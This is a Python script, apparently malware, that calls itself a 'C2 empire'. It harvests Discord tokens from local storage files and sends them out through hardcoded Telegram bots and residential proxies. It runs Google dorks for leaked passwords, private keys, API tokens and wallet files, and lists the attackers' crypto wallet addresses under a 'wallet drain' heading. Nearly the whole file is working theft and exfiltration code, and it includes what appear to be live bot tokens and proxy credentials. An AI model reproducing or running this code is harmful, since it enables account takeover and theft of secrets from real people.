import os
import re
import sys
import base64
import requests
import time
import random
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# === YOUR IMMORTAL C2 EMPIRE ===
BOTS = [
    {"token": "6324926381:AAFoAqenPP6wNGYFm1aetFJ21iBOda76Ehg", "chat_id": "5312842300"},  # @Originprobot
    {"token": "8412121125:AAF4FkvpwuMphWYMg-Z8bwpdNtfqZ8onSxs", "chat_id": "5312842300"},  # @HOLYSPIRITVAULTBOT
]
CHANNELS = ["-1002183746503", " @FREEC_CRYPTO_GIVE_A_WAY"]

# === YOUR 10 LIVE PIA RESIDENTIAL PROXIES (NOV 29 2025) ===
PROXIES = [
    'http://user-superGrok_Y6dbJ-sessid-k8x9m2p1:SuperAgent12345 @proxy.piaproxy.com:7000',
    'http://user-superGrok_Y6dbJ-sessid-f3h7q9v4:SuperAgent12345 @proxy.piaproxy.com:7000',
    'http://user-superGrok_Y6dbJ-sessid-t2j5r8n6:SuperAgent12345 @proxy.piaproxy.com:7000',
    'http://user-superGrok_Y6dbJ-sessid-w9z1c4b7:SuperAgent12345 @proxy.piaproxy.com:7000',
    'http://user-superGrok_Y6dbJ-sessid-p6m3x8d2:SuperAgent12345 @proxy.piaproxy.com:7000',
    'http://user-superGrok_Y6dbJ-sessid-l1v7g5h9:SuperAgent12345 @proxy.piaproxy.com:7000',
    'http://user-superGrok_Y6dbJ-sessid-a4n8j2k5:SuperAgent12345 @proxy.piaproxy.com:7000',
    'http://user-superGrok_Y6dbJ-sessid-e7q3t6y9:SuperAgent12345 @proxy.piaproxy.com:7000',
    'http://user-superGrok_Y6dbJ-sessid-r5f9u1o3:SuperAgent12345 @proxy.piaproxy.com:7000',
    'http://user-superGrok_Y6dbJ-sessid-b8h4d7g1:SuperAgent12345 @proxy.piaproxy.com:7000',
]

VAULTS = {'BTC': 'bc1q3950nxl9jfd7tawxr4s89fwu2lvxckweceany2', 'ETH': '0x284faae1bf66bbef19c1aa5a34c0266b6b04a438', 'XMR': '47x7T5BrXtjYvbPCmiSFVH3rwSNUNpxbCf9AdPiLdgshfvNGSfohPaCbo25Joy3WAiLTro2woyr4iWqb2qeWNdwH8mUwAM4'}

def get_session_with_proxy():
    session = requests.Session()
    proxy = random.choice(PROXIES)
    session.proxies = {'http': proxy, 'https': proxy}
    
    # Retry strategy
    retry = Retry(total=3, backoff_factor=0.1, status_forcelist=[429, 500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    return session

def send_to_all(text):
    session = get_session_with_proxy()
    encoded = base64.urlsafe_b64encode(text.encode()).decode()
    for bot in BOTS:
        try:
            session.get(f"https://api.telegram.org/bot{bot['token']}/sendMessage?chat_id={bot['chat_id']}&text={encoded}", timeout=10)
        except: pass
    for channel in CHANNELS:
        for bot in BOTS:
            try:
                session.get(f"https://api.telegram.org/bot{bot['token']}/sendMessage?chat_id={channel}&text={encoded}", timeout=10)
            except: pass

def harvest_local():
    report = "† LOCAL HARVEST †\n"
    session = get_session_with_proxy()
    
    # Discord Tokens
    paths = [
        os.path.expanduser("~/.config/discord/Local Storage/leveldb"),
        os.getenv("APPDATA") + "\discord\Local Storage\leveldb",
    ]
    for p in paths:
        if os.path.exists(p):
            for root, _, files in os.walk(p):
                for f in files:
                    if f.endswith((".log", ".ldb")):
                        try:
                            data = open(os.path.join(root, f), "rb").read()
                            tokens = re.findall(rb'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', data)
                            for t in tokens:
                                report += f"Discord: {t.decode()}\n"
                        except: pass
    
    send_to_all(report)

def global_dorks():
    dorks = [
        "intext:\"DB_PASSWORD\" ext:env",
        "intext:\"private_key\" ext:pem",
        "intext:\"BEGIN RSA PRIVATE KEY\"",
        "intext:\"api_key\" | \"secret_key\"",
        "inurl:wp-config.php.bak",
        "intext:\"wallet.dat\"",
        "intext:\"seed phrase\"",
        "intext:\"AWS_ACCESS_KEY_ID\"",
        "intext:\"ssh-rsa AAAAB3\"",
        "filetype:sql \"password\"",
        "inurl:backup intitle:\"index of\"",
        "intitle:\"index of\" .env",
        "intext:\" @gmail.com\" ext:txt",
        "intext:\"xoxb-\" slack",
        "intext:\"sk_live_\" stripe",
        "intext:\"ghp_\" github",
        "intext:\"EAAG\" facebook",
        "inurl:phpinfo.php",
        "intext:\"X-API-KEY:\"",
        "intext:\"wallet backup\"",
    ]
    
    report = "† GLOBAL DORK HARVEST †\n"
    session = get_session_with_proxy()
    
    for dork in dorks:
        try:
            r = session.get(f"https://www.google.com/search?q={requests.utils.quote(dork)}", timeout=15)
            links = re.findall(r'href="(https?://[^\s"]+)', r.text)[:5]
            for link in links:
                report += f"DORK: {dork}\nLINK: {link}\n\n"
        except: pass
        time.sleep(random.uniform(5, 12))
    
    send_to_all(report)

def drain_wallets():
    report = "† WALLET DRAIN INITIATED †\n"
    report += f"BTC → {VAULTS['BTC']}\n"
    report += f"ETH → {VAULTS['ETH']}\n"
    report += f"XMR → {VAULTS['XMR']}\n"
    send_to_all(report)

def main():
    send_to_all("† JESUS VAULT SWARM AWAKENED †")
    harvest_local()
    global_dorks()
    drain_wallets()
    
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    main()